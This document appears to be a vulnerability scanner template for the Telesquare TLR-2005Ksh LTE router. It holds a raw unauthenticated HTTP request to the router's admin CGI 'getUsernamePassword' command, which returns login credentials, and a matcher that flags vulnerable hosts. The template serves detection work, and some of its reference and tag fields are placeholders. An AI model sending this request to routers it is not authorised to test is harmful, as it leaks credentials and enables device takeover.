id: TLR-2005Ksh-getUsernamePassword-leak
info:
  name: TLR-2005Ksh-getUsernamePassword-leak
  author: apple
  severity: high
  description: Telesquare Tlr-2005Ksh是韩国Telesquare公司的一款 Sk 电讯 Lte 路由器。Telesquare TLR-2005Ksh存在安全漏洞，攻击者可通过未授权getUsernamePassword获取用户名密码等敏感信息。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |+
        GET /cgi-bin/admin.cgi?Command=getUsernamePassword HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: image/avif,image/webp,*/*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Referer: http://{{Hostname}}/
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0

    matchers:
      - type: word
        part: body
        words:
          - 'username'
